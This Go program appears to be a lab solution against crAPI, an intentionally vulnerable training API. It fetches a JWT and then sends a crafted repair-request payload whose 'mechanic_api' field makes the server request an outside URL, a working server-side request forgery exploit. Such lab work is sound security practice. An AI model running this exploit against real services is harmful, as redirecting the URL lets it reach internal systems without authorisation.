package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"

	configurator "github.com/tomek-skrond/crapiconfigurator"
)

func main() {
	pwd, _ := os.Getwd()
	config, err := configurator.GetConfig(pwd + "/config.json")
	if err != nil {
		log.Fatalln(err)
	}

	// get jwt token
	token := configurator.GetJWTToken(config.LoginURL, config.Email, config.Password)
	if token == "" {
		log.Fatalln("token empty")
	}

	SSRF(token, config.TargetURL)
}

func SSRF(token, target_url string) {
	payload := map[string]interface{}{
		"mechanic_code":            "TRAC_JHN",
		"problem_details":          "test problem",
		"vin":                      "5OUCN24JOCO495860",
		"mechanic_api":             "https://www.google.com",
		"repeat_request_if_failed": false,
		"number_of_repeats":        1,
	}

	jsonPayload, err := json.Marshal(payload)
	if err != nil {
		log.Fatalln(err)
	}

	request, err := http.NewRequest("POST", target_url, bytes.NewBuffer(jsonPayload))
	if err != nil {
		log.Println(err)
	}
	request = configurator.ConfigureRequest(request, token)
	request.Header.Add("Content-Type", "application/json")

	response, err := configurator.CustomHttpClient().Do(request)
	if err != nil {
		log.Fatalln(err)
	}

	responseBody, err := io.ReadAll(response.Body)
	if err != nil {
		log.Fatalln("Error reading response body:", err)
	}

	fmt.Println("Request to other website on behalf of crapi (SSRF):")
	fmt.Println(string(responseBody))
}
